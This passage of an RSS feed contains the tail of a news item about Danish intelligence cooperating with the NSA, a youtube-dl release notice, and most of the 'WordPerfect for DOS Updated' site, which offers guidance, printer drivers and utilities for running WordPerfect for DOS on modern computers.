afsløring: FE masseindsamler oplysninger om danskere gennem avanceret spionsystem&lt;/a&gt; (Sept. 24, 2020)&lt;br/&gt;- Berlingske: &lt;a href=&quot;https://www.berlingske.dk/samfund/et-pengeskab-paa-kastellet-har-i-aartier-gemt-paa-et-dybt-fortroligt&quot; target=&quot;_blank&quot;&gt;Et pengeskab på Kastellet har i årtier gemt på et dybt fortroligt dokument. Nu er hemmeligheden brudt&lt;/a&gt; (Sept. 13, 2020)&lt;br/&gt;- The Local: &lt;a href=&quot;https://www.thelocal.dk/20200828/danish-intelligence-scandal-related-data-sharing-with-us-agency-according-to-media&quot; target=&quot;_blank&quot;&gt;Danish intelligence scandal related data sharing with US agency, according to media&lt;/a&gt; (August 28, 2020)&lt;br/&gt;- The Register: &lt;a href=&quot;https://www.theregister.com/2020/08/25/denmark_domestic_spying/&quot; target=&quot;_blank&quot;&gt;The Viking Snowden: Denmark spy chief 'relieved of duty' after whistleblower reveals illegal snooping on citizens&lt;/a&gt; (August 25, 2020)&lt;br/&gt;- BBC: &lt;a href=&quot;https://www.bbc.com/news/world-europe-53889612&quot; target=&quot;_blank&quot;&gt;Danish military intelligence head Lars Findsen suspended&lt;/a&gt; (August 24, 2020)&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 01 Nov 2020 17:30:02 +0000</pubDate>
<dc:creator>XzetaU8</dc:creator>
<og:url>https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html</og:url>
<og:title>Danish military intelligence uses XKEYSCORE to tap cables in cooperation with the NSA</og:title>
<og:description>A weblog about Signals Intelligence, Communications Security and top level telecommunications equipment</og:description>
<og:image>https://1.bp.blogspot.com/-FEhoYi_a0EI/X3lHJbfeSlI/AAAAAAAAEyk/urOidzARWswgJstbeNFiU8CRo38JQMufACPcBGAYYCw/w1200-h630-p-k-no-nu/fe-xks-header.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html</dc:identifier>
</item>
<item>
<title>New youtube-dl release: v2020.11.01.1</title>
<link>https://youtube-dl.org/</link>
<guid isPermaLink="true" >https://youtube-dl.org/</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://youtube-dl.org/&quot;&gt;https://youtube-dl.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=24959947&quot;&gt;https://news.ycombinator.com/item?id=24959947&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 750&lt;/p&gt;
&lt;p&gt;# Comments: 238&lt;/p&gt;
</description>
<pubDate>Sun, 01 Nov 2020 15:09:55 +0000</pubDate>
<dc:creator>geophertz</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://youtube-dl.org/</dc:identifier>
</item>
<item>
<title>WordPerfect for DOS Updated</title>
<link>http://www.columbia.edu/~em36/wpdos/</link>
<guid isPermaLink="true" >http://www.columbia.edu/~em36/wpdos/</guid>
<description>&lt;head&gt;&lt;title&gt;WordPerfect for DOS Updated&lt;/title&gt;&lt;link href=&quot;http://www.columbia.edu/~em36/wpdos/wpdosrss.xml&quot; rel=&quot;alternate&quot; title=&quot;RSS&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link href=&quot;http://www.columbia.edu/~em36/wpdos/favicon.ico&quot; rel=&quot;SHORTCUT ICON&quot; /&gt;&lt;link href=&quot;wpdos.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;meta content=&quot;en-us&quot; http-equiv=&quot;Content-Language&quot; /&gt;&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;515.85693380977&quot;&gt;
&lt;h6 class=&quot;auto-style3&quot;&gt;WordPerfect for DOS Updated | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/sitemap.html&quot;&gt;Site Map&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/search.html&quot;&gt;Search&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/trouble.html&quot;&gt;Troubleshooting Guide&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;Feedback&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/voluntary.html&quot;&gt;Voluntary Contributions&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/faq.html&quot;&gt;FAQ&lt;/a&gt;&lt;/h6&gt;

&lt;h4&gt;WPDOS under Modern Windows and macOS, New Printer Drivers, Euro Symbol Support, and Added Features for WPDOS 5.1 and 6.x&lt;/h4&gt;
&lt;hr /&gt;&lt;p class=&quot;map&quot;&gt;&lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/sitemap.html&quot;&gt;Site map&lt;/a&gt;&lt;/strong&gt; | &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/search.html&quot; target=&quot;_blank&quot;&gt;Search this site&lt;/a&gt;&lt;/strong&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#newwindows&quot;&gt;If WP won't run on your new computer&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#summary&quot;&gt;Summary&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#quick&quot;&gt;Quick solutions to common problems&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#antivirus&quot;&gt;Anti-virus false positives&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#contribute&quot;&gt;Voluntary contributions&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#changes&quot;&gt;Recent changes (RSS)&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#announce&quot;&gt;Announcements&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#reason&quot;&gt;The reasons for this&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#printer&quot;&gt;New printer drivers&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#windows&quot;&gt;WPDOS under Windows&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#winprint&quot;&gt;Windows printing problems solved&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#anyprinter&quot;&gt;Print to any printer or any Windows fax program&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#graphicsinwindow&quot;&gt;WPDOS graphics mode in a window&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#wpmac&quot;&gt;WP for and on the Mac&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#workarounds&quot;&gt;Workarounds&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#euro&quot;&gt;Euro symbol&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#graphicsmode&quot;&gt;Graphics mode survival guide&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#textmode&quot;&gt;Text mode survival guide&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#addfeatures&quot;&gt;Additional and under-documented features&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#arabichebrew&quot;&gt;Arabic and Hebrew WP&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#wpcutils&quot;&gt;WordPerfect-related programs and utilities&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#thirdparty&quot;&gt;Third-party tools&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#ftplinks&quot;&gt;Discussion groups and other links&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#obtain&quot;&gt;Obtaining WPDOS&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#patch&quot;&gt;WPDOS 6.2 patch program&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#linuxnote&quot;&gt;Linux&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#forcoreltodo&quot;&gt;What Corel should have done&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#feedback&quot;&gt;Feedback&lt;/a&gt; | &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#acknowledgments&quot;&gt;Acknowledgments&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;Why some people still use a DOS-era word processor&lt;/h4&gt;
&lt;p&gt;Everything is explained &lt;a href=&quot;https://xkcd.com/1891/&quot;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;newwindows&quot; id=&quot;newwindows&quot;&gt;If WordPerfect for DOS won't run on your new Windows 10 computer&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Go &lt;em&gt;immediately&lt;/em&gt; to this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswp.html&quot;&gt;vDos-based &lt;strong&gt;vDosWP system&lt;/strong&gt;&lt;/a&gt; (or to the less-useful &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/dosboxwp.html&quot;&gt;DOSBox-based &lt;strong&gt;DOSBoxWP system&lt;/strong&gt;&lt;/a&gt;). You probably need not look at any other page on this site other than the first of these.&lt;/p&gt;
&lt;p&gt;If you are a &lt;em&gt;medical transcriptionist or court reporter&lt;/em&gt; who uses abbreviation-expander software (e.g., SmarType or PRD+) with WordPerfect for DOS, get in touch with me via the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;feedback&lt;/a&gt; page to learn about solutions that will make it possible to use your software under Windows 10.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;upgrade32&quot; id=&quot;upgrade32&quot;&gt;If (and &lt;em&gt;only&lt;/em&gt; if) you have upgraded an existing &lt;em&gt;32-bit&lt;/em&gt; Windows 7 or 8.1 computer to &lt;em&gt;32-bit&lt;/em&gt; Windows 10&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;See this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/windowsten.html&quot;&gt;WPDOS under 32-bit Windows 10&lt;/a&gt; page. Also, you may want to read the advice in items 5 and 6 in the first post &lt;a href=&quot;http://www.wpuniverse.com/vb/showthread.php?37078-How-to-run-WPDOS-on-your-new-Windows-8-or-10-computer&quot;&gt;this thread&lt;/a&gt; at WPUniverse.com. This advice only applies if you are &lt;em&gt;absolutely positively certain&lt;/em&gt; that you have &lt;strong&gt;32-bit&lt;/strong&gt; Windows 10 on your computer. &lt;em&gt;If you don't know whether you have &lt;strong&gt;32-bit&lt;/strong&gt; Windows on your computer, then you don't have it, and should ignore this paragraph!&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;summary&quot; id=&quot;summary&quot;&gt;Summary: all you need to know about WPDOS 5.1, 6.0, 6.1, and 6.2 on modern computers&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;WordPerfect for DOS will run on any modern Windows-based computer,&lt;/em&gt;&lt;/strong&gt; but under 64-bit Windows it requires one of the two special systems mentioned immediately above. &lt;em&gt;There is no longer any advantage to running WPDOS under 32-bit Windows.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;This site provides methods for running WordPerfect for DOS on 64-bit versions of Windows, including Windows 7, 8, and 10.&lt;/em&gt;&lt;/strong&gt; This site recommends that you use one of two special systems devised for this site that make this possible: either the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswp.html&quot;&gt;vDos-based &lt;strong&gt;vDosWP system&lt;/strong&gt;&lt;/a&gt; or the older and less-capable &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/dosboxwp.html&quot;&gt;DOSBox-based &lt;strong&gt;DOSBoxWP system&lt;/strong&gt;&lt;/a&gt;. Information about &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/64bitwindows.html&quot; target=&quot;_blank&quot;&gt;other methods&lt;/a&gt; of running WordPerfect for DOS under 64-bit Windows may also be found on this site.&lt;/p&gt;
&lt;p class=&quot;note&quot;&gt;&lt;em&gt;Note:&lt;/em&gt; It makes absolutely no difference whether you have a Pro or Basic or Home or Ultimate or Enterprise or any other specific subtype of any version of Windows; WordPerfect for DOS will run equally well on Pro, Basic, Home, or any other variety of Windows. &lt;em&gt;Please do not waste your valuable time sending me messages asking whether WP will run on your Home or Basic verson of whatever variety of Windows.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;This site provides methods for running WordPerfect for DOS on Macintosh computers.&lt;/em&gt;&lt;/strong&gt; You do not have to give up WordPerfect for DOS if you switch to a Mac. See this site's new &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswpmac.html&quot;&gt;vDosWP for the Mac method&lt;/a&gt; for running WPDOS on the Mac, or its older &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpdosboxmac.html&quot; target=&quot;_blank&quot;&gt;DOSBox-based method&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you are &lt;em&gt;already running WPDOS on a 32-bit Windows computer&lt;/em&gt;, and you are looking for a &lt;strong&gt;printer driver&lt;/strong&gt; for your new printer, see this site's &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/51printers.html&quot;&gt;printer driver page for WPDOS 5.1&lt;/a&gt; or a separate &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/6xprinters.html&quot;&gt;printer driver page for WPDOS 6.0, 6.1, or 6.2.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This site provides utilities that run under all versions of Windows and &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/converttoword.html#wptodocx&quot;&gt;&lt;strong&gt;convert WP files to DOCX format&lt;/strong&gt;&lt;/a&gt;, or &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wordtowpdos.html#docxtowp&quot;&gt;convert DOCX files to WP format&lt;/a&gt;&lt;/strong&gt;, or &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/tools.html#wptoclip&quot;&gt;&lt;strong&gt;copy the contents of a WP file to the Windows clipboard&lt;/strong&gt;&lt;/a&gt; for pasting into other applications.&lt;/p&gt;
&lt;p&gt;If you need to open old WordPerfect files (files created in WPDOS 4.2, 5.1, or 6.x) on a modern computer, you can use any recent version of &lt;strong&gt;&lt;a href=&quot;http://www.wordperfect.com/&quot;&gt;WordPerfect for Windows&lt;/a&gt;&lt;/strong&gt;. All versions of &lt;strong&gt;Microsoft Word for Windows&lt;/strong&gt; can open WordPerfect 5.1 files, and most can open WordPerfect 6.x files, but only if the necessary converter files were installed together with Word. If these converters are missing from your Word installation, they can be added by running a “Repair” installation of Microsoft Word; use your favorite search engine if you need to find instructions.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;strong&gt;&lt;a name=&quot;antivirus&quot; id=&quot;antivirus&quot;&gt;False positives from antivirus software&lt;/a&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;If your antivirus software tells you that any program downloaded from this site is infected with malware, this is the result of a &quot;false positive.&quot; &lt;strong&gt;&lt;em&gt;Do not waste your valuable time by sending me an e-mail asking for advice!&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;If you do not trust my software, do not use my software!&lt;/em&gt; Use &lt;a href=&quot;http://products.office.com&quot;&gt;something else&lt;/a&gt; instead.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;quick&quot; id=&quot;quick&quot;&gt;Quick solutions for common problems&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;For fast access to this site's mostly commonly-requested advice, please go directly to the &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/trouble.html&quot;&gt;troubleshooting page&lt;/a&gt;&lt;/strong&gt;. You can also &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/search.html&quot; target=&quot;_blank&quot;&gt;search the complete text of this site&lt;/a&gt;&lt;/strong&gt; with the Google, Yahoo, or Bing search engines. For an overview of the information available on this site, please visit the &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/sitemap.html&quot;&gt;site map&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;You may also want to read some of the &lt;strong&gt;&lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/faq.html&quot;&gt;frequently-asked questions&lt;/a&gt;&lt;/strong&gt; about the contents of this site.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;contribute&quot; id=&quot;contribute&quot;&gt;Voluntary contributions&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;If any of the drivers, files, or suggestions on this site are of value to you or your business, please consider making a &lt;strong&gt;&lt;em&gt;voluntary contribution to help pay the costs of maintaining the site.&lt;/em&gt;&lt;/strong&gt; Payment can easily be made in U.S. or Canadian dollars, Euros, Pounds Sterling, or other currencies through this link to &lt;a href=&quot;https://www.paypal.com/cgi-bin/webscr?amp;no_shipping=1&amp;amp;return=http://www.columbia.edu/~em36/wpdos/contribthk.html&amp;amp;item_name=Contribution+to+WPDOS+Updated&amp;amp;submit.x=34&amp;amp;submit.y=15&amp;amp;business=em36@columbia.edu&amp;amp;undefined_quantity=0&amp;amp;cmd=_xclick&quot; target=&quot;_blank&quot;&gt;the PayPal payment service.&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;changes&quot; id=&quot;changes&quot;&gt;Selected recent changes to this site&lt;/a&gt; &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/wpdosrss.xml&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;RSS Feed&quot; class=&quot;auto-style4&quot; height=&quot;15&quot; src=&quot;http://www.columbia.edu/~em36/wpdos/rss_feed.gif&quot; width=&quot;32&quot; /&gt;&lt;/a&gt;&lt;/h4&gt;

&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;announce&quot; id=&quot;announce&quot;&gt;Announcements&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;WordPerfect for DOS 5.1+ and 6.2 are legally available for sale on CD&lt;/em&gt;&lt;/strong&gt; to licensed users of WordPerfect for DOS. &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/links.html#obtain&quot;&gt;Further details&lt;/a&gt; are available elsewhere on this site.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Version 6 of &lt;a href=&quot;http://www.tamedos.com&quot; target=&quot;_blank&quot;&gt;Tame from www.tamedos.com&lt;/a&gt; is indispensable for use with WPDOS under 32-bit versions of Windows Vista, 7, 8, and 10&lt;/strong&gt; (but cannot be used with 64-bit versions of Windows).&lt;/em&gt; This US$20 program speeds keyboard input and improves compatibility for WPDOS and other DOS applications under recent Windows versions. New features include the following: italics and underlines can be displayed in text mode; more than 60 lines of text can be visible in a window; the number of rows and columns on screen can be changed while the program is open; text can be copied and pasted to and from the Windows clipboard without macros or add-ons; a keystroke (Win-Enter) switches between windowed mode and a full-screen mode that uses Windows's  fonts but is as fast as - or faster than - WP in traditional hardware-based full-screen mode. A page of &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/tamewp.html&quot;&gt;further details&lt;/a&gt; provides preliminary information on the vast range of customization options available under Tame.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;How to display the euro symbol in MS-DOS and Windows DOS.&lt;/em&gt;&lt;/strong&gt; This site provides instructions for &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/eurodos.html&quot;&gt;typing and displaying the euro symbol in full-screen MS-DOS (including Windows DOS) and in windowed DOS boxes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Appeals for help&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;If anyone knows the internal file format of the .CVX files used by the ConvertPerfect 2.0 program that dates from the WPDOS 6.x era, please &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/feedback.html&quot;&gt;contact me&lt;/a&gt;. ConvertPerfect was also used by Novell GroupWise, and the file format may perhaps have been documented by Novell.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Alternate address for this site:&lt;/strong&gt;&lt;/em&gt;  This site can almost always be reached at an “alias” address, &lt;strong&gt;&lt;span class=&quot;headcolor&quot;&gt;http://wpdos.org&lt;/span&gt;&lt;/strong&gt;. It can, of course, also be reached at its real address, &lt;span class=&quot;headcolor&quot;&gt;&lt;strong&gt;http://www.columbia.edu/~em36/wpdos&lt;/strong&gt;&lt;/span&gt;.&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;reason&quot; id=&quot;reason&quot;&gt;The reasons for this&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;WordPerfect for DOS, in the opinion of many knowledgeable users, is still the greatest program ever written. Some of its features have not been matched even by the latest Windows software, and its interface remains unequaled for efficiency and elegance. Its support for multiple font formats has not been equaled by any other program or operating system, and its support for multiple alphabets, languages, and symbol sets has only been equaled by twenty-first-century versions of Windows, Linux, and the Mac OS.&lt;/p&gt;
&lt;p&gt;As a reviewer for &lt;em&gt;PC Magazine&lt;/em&gt; and other publications since 1985, I have tested hundreds of programs, including almost every word processor that was ever released to the public, plus one or two, like IBM's Signature, that were never released at all. There is much to admire in WordPerfect for Windows (and every user of the DOS version should own a copy of the Windows version, for use with graphics-rich documents), but I still return to WordPerfect for DOS whenever I want to get any serious work done, and even when I simply want to write a letter and address an envelope. (If there were a truth-in-reviewing law, it would oblige me to add that, among &lt;em&gt;graphics-based&lt;/em&gt; word processors, I generally prefer Microsoft Word for Windows to Corel WordPerfect for Windows, but if I were forced to choose only one word processor, and I could choose among all text-based and graphic-based programs, I would unhesitatingly choose WordPerfect for DOS 6.2.)&lt;/p&gt;
&lt;p&gt;This site was created as a way to share printer drivers and other files that can be of help to anyone who wants to continue to use WordPerfect for DOS in the twenty-first century. This site exists partly because the DOS “environment” (the so-called Virtual DOS Machine, or VDM) in recent 32-bit versions of Windows (including XP, Vista, 32-bit Windows 7, 32-bit Windows 8, and 32-bit Windows 10) is in many ways slow and awkward compared to the original MS-DOS operating system.&lt;/p&gt;
&lt;p&gt;The awkward Virtual DOS Machine (VDM) in current versions of Windows derives from the original VDM that Microsoft wrote for Windows NT. It did not need to be as awkward as it is. The old OS/2 operating system, which began as a joint project of Microsoft and IBM, included a superb DOS environment, probably the best ever written, which was the work of a group of Microsoft programmers led by Ben Slivka, who was still working at Microsoft when Windows NT was being written a few years later. Microsoft had the resources to make a Windows NT VDM that worked well, but simply didn't use them, and we continue to suffer the consequences.&lt;/p&gt;
&lt;p class=&quot;note&quot;&gt;&lt;em&gt;Note to WordPerfect for Windows users:&lt;/em&gt; The most generally reliable versions of WordPerfect for Windows are probably Corel WordPerfect X9 and 2000.&lt;/p&gt;
&lt;p class=&quot;note&quot;&gt;WordPerfect is a registered trademark of &lt;a href=&quot;http://www.corel.com&quot; target=&quot;_blank&quot;&gt;Corel Corporation&lt;/a&gt;. This site (which was created in Microsoft FrontPage and is maintained in &lt;a href=&quot;http://www.microsoft.com/expression&quot; target=&quot;_blank&quot;&gt;Microsoft Expression Web&lt;/a&gt;) is not associated with Corel Corporation, &lt;em&gt;PC Magazine&lt;/em&gt;, or any other person or organization. The site is hosted on Columbia University's web server, but the university is not responsible for any of the site's content. Corel Corporation does not support or endorse any of the documents or files on this site, and is perhaps not even aware that the site exists. &lt;span class=&quot;nobr&quot;&gt;&lt;em&gt;- Edward&lt;/em&gt;&lt;/span&gt; &lt;em&gt;Mendelson&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;printer&quot; id=&quot;printer&quot;&gt;WPDOS printer drivers for recently-released printers&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;This site provides many new printer drivers for WPDOS 5.1 and 6.x, and links to the original printer drivers created by WordPerfect Corporation when WPDOS 5.1 and 6.x were first released.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;These drivers are &lt;strong&gt;not&lt;/strong&gt; needed by the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswp.html&quot;&gt;vDosWP&lt;/a&gt; and &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/dosboxwp.html&quot;&gt;DOSBoxWP&lt;/a&gt; systems for running WordPerfect for DOS under 64-bit Windows; suitable drivers are supplied with the system itself.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This site has &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/51printers.html&quot;&gt;new &lt;strong&gt;WPDOS 5.1&lt;/strong&gt; drivers&lt;/a&gt; for the &lt;strong&gt;HP LaserJet, HP Color LaserJet, and Business Inkjet&lt;/strong&gt; models. Both PCL and PostScript drivers are available; all 80 internal fonts in the 3200 and later models are supported; and all these drivers support the euro through the printer's hardware or through soft fonts available from this site. Drivers are also supplied for recent &lt;strong&gt;HP OfficeJet&lt;/strong&gt; and other inkjet models, with euro support where available. Drivers are also available for recent &lt;strong&gt;Postscript Level 3&lt;/strong&gt; printers, &lt;strong&gt;Lexmark Optra laser&lt;/strong&gt; printers. Special &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/euro.html#ljdriver3&quot;&gt;HP LaserJet drivers that “draw” the euro symbol,&lt;/a&gt; for older printers without built-in euro support, are also available. &lt;em&gt;All these drivers are written by the author of this site, and are not endorsed or supported by Corel, Hewlett Packard, Lexmark, or anyone else.&lt;/em&gt; Information is also provided on drivers available elsewhere for some other printer models.&lt;/p&gt;
&lt;p&gt;This site also has &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/6xprinters.html&quot;&gt;new &lt;strong&gt;WPDOS 6.x&lt;/strong&gt; drivers&lt;/a&gt; for all recent &lt;strong&gt;HP LaserJet, HP Color LaserJet, and HP Business InkJet&lt;/strong&gt; models. Both PCL and PostScript modes are supported; all 80 internal fonts in the 3200 and later models are supported; and all these drivers support the euro symbol either through the printer's hardware or through soft fonts available from this site. Drivers are also supplied for recent &lt;strong&gt;HP OfficeJet&lt;/strong&gt; and other inkjet models, with euro support where available. Drivers are also available for recent &lt;strong&gt;Postscript Level 3&lt;/strong&gt; printers&lt;strong&gt;, Lexmark Optra laser&lt;/strong&gt; printers, and some &lt;strong&gt;Canon bubble-jet&lt;/strong&gt; printers. Special &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/euro.html#ljdriver3&quot;&gt;HP LaserJet drivers that “draw” the euro symbol,&lt;/a&gt; for older printers without built-in euro support, are also available. All these drivers (like all other WPDOS6.x printer drivers) may also be used with Corel WordPerfect for Linux. &lt;em&gt;All these drivers were prepared by the author of this site, and are not endorsed or supported by Corel, Hewlett Packard, Lexmark, Canon, or anyone else.&lt;/em&gt; Information is provided on drivers available elsewhere for some other printer models.&lt;/p&gt;
&lt;p&gt;This site's WPDOS 5.1 and 6.x driver pages also offer recommendations that can help you to choose a printer that works effectively with WPDOS 5.1 or 6.x.&lt;/p&gt;
&lt;p&gt;If possible, I will try to provide drivers for other printers not supported on this site if you are willing to beta-test the results. Some Windows-only printers, however, cannot be directly supported through custom WPDOS drivers; for these printers, see this site's instructions on &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/#anyprinter&quot;&gt;printing to any Windows printer&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The original WPDOS 5.1 and 6.x printer drivers are available from Corel's page for &lt;a href=&quot;ftp://ftp.corel.com/pub/printdrivers/wp5x/!index.htm&quot; target=&quot;_blank&quot;&gt;WPDOS 5.1 printer drivers&lt;/a&gt; or its page for &lt;a href=&quot;ftp://ftp.corel.com/pub/printdrivers/wp6x/!index.htm&quot; target=&quot;_blank&quot;&gt;WPDOS 6.x printer drivers&lt;/a&gt;. If you have difficulty downloading files from Corel's site, see this &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/trouble.html#badcorel&quot;&gt;troubleshooting advice&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;h4&gt;&lt;a name=&quot;windows&quot; id=&quot;windows&quot;&gt;WordPerfect for DOS under Windows&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Most Windows users should start at either this site's page about the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/vdoswp.html&quot;&gt;vDosWP method&lt;/a&gt; of running WPDOS under 64-bit Windows or, as a distant second choice, the page about the &lt;a href=&quot;http://www.columbia.edu/~em36/wpdos/dosboxwp.html&quot;&gt;DOSBox-based DOSBoxWP&lt;/a&gt; method.&lt;/p&gt;
